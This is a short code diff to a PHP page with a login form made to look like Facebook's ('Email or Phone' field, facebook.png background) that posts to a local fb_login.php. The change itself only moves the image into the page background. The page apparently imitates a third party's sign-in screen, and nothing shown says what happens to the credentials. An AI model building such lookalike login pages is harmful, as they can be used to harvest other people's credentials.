@@ -9,6 +9,8 @@ unlink('mirazmac_cookie.txt');
       //echo '</form>'; 
       //echo '</div>';
 ?>
+<body background='facebook.png'>
+
 <div align="right">
   <form action="fb_login.php" method="post">
       <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">
@@ -17,7 +19,6 @@ unlink('mirazmac_cookie.txt');
   </form>
 </div>
 
-<img src='facebook.png'>
 
 
 
